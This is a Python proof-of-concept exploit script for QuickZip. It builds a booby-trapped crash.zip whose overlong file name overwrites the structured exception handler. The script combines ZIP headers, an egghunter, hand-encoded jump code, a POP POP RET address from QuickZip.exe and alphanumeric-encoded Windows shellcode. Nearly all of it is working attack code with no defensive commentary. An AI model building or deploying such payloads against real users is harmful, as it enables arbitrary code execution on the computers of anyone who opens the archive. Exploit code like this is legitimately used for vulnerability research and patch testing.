#!/usr/bin/python

header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")

print "[+] Building PoC.."

shellcode = ("B00BB00B"
"\x83\xe4\xf0" # stack aligment
"\x89\xe3\xdd\xc7\xd9\x73\xf4\x58\x50\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x39\x6c\x48\x68\x6d\x52\x47\x70\x77\x70\x57\x70\x31\x70\x4f"
"\x79\x39\x75\x56\x51\x4b\x70\x43\x54\x6c\x4b\x36\x30\x54\x70"
"\x4e\x6b\x56\x32\x64\x4c\x6c\x4b\x72\x72\x52\x34\x4c\x4b\x62"
"\x52\x67\x58\x36\x6f\x4e\x57\x43\x7a\x55\x76\x65\x61\x59\x6f"
"\x4c\x6c\x37\x4c\x70\x61\x61\x6c\x57\x72\x54\x6c\x51\x30\x79"
"\x51\x48\x4f\x56\x6d\x67\x71\x6b\x77\x7a\x42\x5a\x52\x76\x32"
"\x71\x47\x6e\x6b\x31\x42\x64\x50\x6e\x6b\x61\x5a\x77\x4c\x4e"
"\x6b\x52\x6c\x72\x31\x61\x68\x6d\x33\x31\x58\x47\x71\x4a\x71"
"\x33\x61\x6c\x4b\x62\x79\x61\x30\x33\x31\x39\x43\x4c\x4b\x63"
"\x79\x76\x78\x39\x73\x57\x4a\x42\x69\x6e\x6b\x66\x54\x4c\x4b"
"\x76\x61\x5a\x76\x75\x61\x69\x6f\x4e\x4c\x69\x51\x78\x4f\x54"
"\x4d\x46\x61\x79\x57\x45\x68\x39\x70\x51\x65\x59\x66\x34\x43"
"\x31\x6d\x6b\x48\x37\x4b\x73\x4d\x67\x54\x34\x35\x59\x74\x71"
"\x48\x4c\x4b\x66\x38\x37\x54\x63\x31\x6b\x63\x63\x56\x4e\x6b"
"\x44\x4c\x72\x6b\x6c\x4b\x71\x48\x57\x6c\x33\x31\x39\x43\x6c"
"\x4b\x57\x74\x6e\x6b\x46\x61\x78\x50\x6b\x39\x72\x64\x75\x74"
"\x76\x44\x73\x6b\x33\x6b\x63\x51\x33\x69\x73\x6a\x33\x61\x49"
"\x6f\x6b\x50\x51\x4f\x33\x6f\x33\x6a\x6c\x4b\x42\x32\x58\x6b"
"\x6e\x6d\x53\x6d\x51\x78\x37\x43\x66\x52\x75\x50\x75\x50\x75"
"\x38\x63\x47\x33\x43\x55\x62\x63\x6f\x71\x44\x55\x38\x52\x6c"
"\x51\x67\x61\x36\x67\x77\x69\x6f\x7a\x75\x6e\x58\x7a\x30\x33"
"\x31\x33\x30\x53\x30\x71\x39\x79\x54\x56\x34\x50\x50\x52\x48"
"\x45\x79\x6b\x30\x52\x4b\x57\x70\x79\x6f\x39\x45\x62\x70\x52"
"\x70\x50\x50\x76\x30\x73\x70\x72\x70\x73\x70\x62\x70\x35\x38"
"\x49\x7a\x34\x4f\x6b\x6f\x49\x70\x4b\x4f\x48\x55\x5a\x37\x61"
"\x7a\x55\x55\x62\x48\x6b\x70\x4e\x48\x71\x48\x72\x4f\x70\x68"
"\x34\x42\x75\x50\x47\x71\x4f\x4b\x4c\x49\x6b\x56\x42\x4a\x56"
"\x70\x32\x76\x32\x77\x53\x58\x4f\x69\x6e\x45\x44\x34\x50\x61"
"\x69\x6f\x4e\x35\x4f\x75\x4f\x30\x33\x44\x74\x4c\x69\x6f\x52"
"\x6e\x47\x78\x63\x45\x38\x6c\x70\x68\x58\x70\x4c\x75\x6d\x72"
"\x43\x66\x39\x6f\x58\x55\x42\x48\x53\x53\x52\x4d\x63\x54\x35"
"\x50\x4d\x59\x48\x63\x50\x57\x53\x67\x70\x57\x76\x51\x6a\x56"
"\x71\x7a\x35\x42\x32\x79\x70\x56\x48\x62\x59\x6d\x70\x66\x4b"
"\x77\x42\x64\x56\x44\x37\x4c\x47\x71\x77\x71\x4c\x4d\x61\x54"
"\x44\x64\x74\x50\x38\x46\x53\x30\x77\x34\x31\x44\x56\x30\x50"
"\x56\x63\x66\x31\x46\x77\x36\x51\x46\x50\x4e\x50\x56\x50\x56"
"\x51\x43\x71\x46\x32\x48\x43\x49\x58\x4c\x67\x4f\x4b\x36\x49"
"\x6f\x4e\x35\x4f\x79\x69\x70\x50\x4e\x53\x66\x47\x36\x69\x6f"
"\x56\x50\x50\x68\x73\x38\x4d\x57\x57\x6d\x75\x30\x6b\x4f\x4a"
"\x75\x4f\x4b\x6a\x50\x6f\x45\x69\x32\x56\x36\x51\x78\x4c\x66"
"\x4c\x55\x4d\x6d\x6d\x4d\x69\x6f\x48\x55\x45\x6c\x35\x56\x53"
"\x4c\x75\x5a\x4d\x50\x59\x6b\x4d\x30\x64\x35\x35\x55\x4f\x4b"
"\x47\x37\x62\x33\x42\x52\x70\x6f\x70\x6a\x45\x50\x32\x73\x69"
"\x6f\x6a\x75\x41\x41")

# 118 bytes
# cat egghunter-B00B.bin |msfvenom -a x86 --platform windows -e x86/alpha_mixed BufferRegister=EBX -f c
egghunter = ("\x53\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x30\x66\x6e\x61\x5a\x6a\x6b\x4f"
"\x56\x6f\x47\x32\x52\x72\x32\x4a\x66\x62\x32\x78\x6a\x6d\x76"
"\x4e\x35\x6c\x37\x75\x52\x7a\x53\x44\x48\x6f\x6e\x58\x31\x52"
"\x44\x70\x64\x70\x57\x32\x4c\x4b\x4b\x4a\x6c\x6f\x54\x35\x69"
"\x7a\x4c\x6f\x71\x65\x68\x67\x39\x6f\x39\x77\x41\x41")

# PUT address of encoded egghunter into EBX
# 0012FB52   55               PUSH EBP
# 0012FB53   58               POP EAX
# 0012FB54   05 61454141      ADD EAX,41414561
# 0012FB59   2D 21414141      SUB EAX,41414121
# 0012FB5E   50               PUSH EAX
# 0012FB5F   5B               POP EBX
# 0012FB60   FFE3             JMP EBX   <== Non alpha-num, so we'll have to encode/decode it

# Align ESP to decode JMP EBX 
# 0012FB8C   54               PUSH ESP
# 0012FB8D   58               POP EAX
# 0012FB8E   05 57474141      ADD EAX,41414757
# 0012FB93   2D 21414141      SUB EAX,41414121
# 0012FB98   50               PUSH EAX
# 0012FB99   5C               POP ESP

# decode JMP EBX
# "\x25\x4a\x4d\x4e\x55"  # AND EAX,0x554E4D4A
# "\x25\x35\x32\x31\x2a"  # AND EAX,0x2A313235
# "\x2d\x10\x1e\x10\x10"  # SUB EAX,0x10101e10
# "\x2d\x73\x7e\x11\x12"  # SUB EAX,0x12117e73
# "\x2d\x7e\x7f\x4d\x4d"  # SUB EAX,0x4d4d7f7e
# "\x50"                  # PUSH EAX

jmpcode = ("\x55"
           "\x58"
           "\x05\x61\x45\x41\x41"
           "\x2d\x21\x41\x41\x41"
           "\x50"
           "\x5B"
           "\x54"
           "\x58"
           "\x05\x57\x47\x41\x41"
           "\x2d\x21\x41\x41\x41"
           "\x50"
           "\x5C"
           "\x25\x4a\x4d\x4e\x55"
           "\x25\x35\x32\x31\x2a"
           "\x2d\x10\x1e\x10\x10"
           "\x2d\x73\x7e\x11\x12"
           "\x2d\x7e\x7f\x4d\x4d"
           "\x50")

nops = "\x41" * (70 -len(jmpcode))

max_size = 4064

junk1 = "A" * (292 -len(egghunter) -len(jmpcode) -len(nops))

# conditional backward jump (ZF=1) of 92bytes (\xff gets converted into \xa0) 
nseh = "\x74\xff\x41\x41"

# 0x00422833 : pop ecx # pop ebp # ret 0x04 | [QuickZip.exe]
seh = "\x33\x28\x42\x00"
payload = egghunter + junk1 + jmpcode + nops + nseh + seh + shellcode + "C" * (max_size -len(egghunter) -len(junk1) -len(jmpcode) -len(nops) -len(nseh) -len(seh) -len(shellcode))
payload += ".txt"

print "[+] Length = " + str(len(payload))

exploit = header_1 + payload + header_2 + payload + header_3

mefile = open('crash.zip','w');
mefile.write(exploit);
mefile.close()

print "[+] Exploit complete!"

